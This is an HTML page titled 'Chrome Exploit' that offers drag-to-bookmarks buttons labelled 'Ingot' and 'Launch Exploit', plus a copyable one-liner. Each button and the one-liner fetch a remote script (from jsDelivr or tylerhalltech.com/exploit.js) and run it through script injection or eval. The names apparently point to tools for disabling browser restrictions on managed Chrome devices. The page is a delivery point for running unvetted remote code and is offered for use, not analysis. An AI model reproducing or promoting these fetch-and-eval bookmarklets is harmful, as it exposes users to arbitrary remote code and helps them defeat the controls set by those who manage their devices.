<title>Chrome Exploit</title>

<div class="title">Exploit Chrome</div>

<div class="button" >Launch Exploit<a href="javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())" class="button-text">Ingot</a></div>
<div class="button-note">Drag the button to your bookmarks bar for easy access.</div>
<hr>
<div class="title">Alternate Method</div>
<div class="button" ><a href="javascript:fetch(&quot;https://tylerhalltech.com/exploit.js&quot;).then(data=>{data.text().then(text=>{eval(text)})});" style="text-decoration: none; font-family: Arial, Helvetica, sans-serif; border-radius: 8px; padding: 20px; display: inline-block; background-color: #04AA6D; color: white; margin: 4px 2px; font-size: 20px; text-align: center;">DRAG ME TO BOOKMARKS</a></div>
<div class="button-note"><a href="">CLICK HERE FOR GUIDE</a><br><br>Note: you should use first medthod instead, this is just an alternate method.</div>

<!--<div>Alternate Method:<br><br><a href="javascript:fetch(&quot;https://tylerhalltech.com/exploit.js&quot;).then(data=>{data.text().then(text=>{eval(text)})});" style="text-decoration: none; font-family: Arial, Helvetica, sans-serif; border-radius: 8px; padding: 20px; display: inline-block; background-color: #04AA6D; color: white; margin: 4px 2px; font-size: 20px; text-align: center;">LTBEEF</a><br>Drag the above button to your bookmark bar and click the bookmarlet twice</div>
-->
<center>
<main><pre><code class="language-css">fetch(`https://tylerhalltech.com/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
</code></pre></main></center>

<script>
const copyButtonLabel = "Copy Code";

// use a class selector if available
let blocks = document.querySelectorAll("pre");

blocks.forEach((block) => {
  // only add button if browser supports Clipboard API
  if (navigator.clipboard) {
    let button = document.createElement("button");

    button.innerText = copyButtonLabel;
    block.appendChild(button);

    button.addEventListener("click", async () => {
      await copyCode(block, button);
    });
  }
});

async function copyCode(block, button) {
  let code = block.querySelector("code");
  let text = code.innerText;

  await navigator.clipboard.writeText(text);

  // visual feedback that task is completed
  button.innerText = "Code Copied";

  setTimeout(() => {
    button.innerText = copyButtonLabel;
  }, 700);
}
</script>

<style>
pre[class*="language-"] {
  position: relative;
  overflow: auto;

  /* make space  */
  margin: 5px 0;
  padding: 1.75rem 0 1.75rem 1rem;
  border-radius: 10px;
}

pre[class*="language-"] button {
  position: absolute;
  top: 5px;
  right: 5px;

  font-size: 0.9rem;
  padding: 0.15rem;
  background-color: #828282;

  border: ridge 1px #7b7b7c;
  border-radius: 5px;
  text-shadow: #c4c4c4 0 0 2px;
}

pre[class*="language-"] button:hover {
  cursor: pointer;
  background-color: #bcbabb;
}

main {
  display: grid;
  max-width: 600px;
  margin: 20px auto;
}

h1 {
  font-size: 1.3rem;
}

@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap');

* {
	font-family: "Roboto";
}

:root {
	color-scheme: dark;
}

body {
	background: #202124;
	margin: 0;
	padding: 0;
}

.title {
	text-align: center;
	font-size: 50px;
	margin: 20px;
	margin-bottom: 50px;
	user-select: none;
    font-weight: 500;
}

.button {
	position: relative;
	width: 230px;
	height: 47px;
	border: 1px solid rgb(95, 99, 104);
	color: rgb(138, 180, 248);
	background: rgba(138, 180, 248, 0.08);
	border-radius: 6px;
	margin: 20px auto;
	display: flex;
	justify-content: center;
	align-items: center;
	font-size: 24px;
	user-select: none;
        font-weight: 500;
}

.button:active {
	background: rgba(138, 180, 248, 0.25);
}

.button-text {
	opacity: 0;
	user-select: none;
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	height: 100%;
	width: 100%;
}

.button-note {
	margin: 0 auto;
	text-align: center;
	color: rgb(138, 180, 248);
	width: 300px;
	user-select: none;
}
</style>
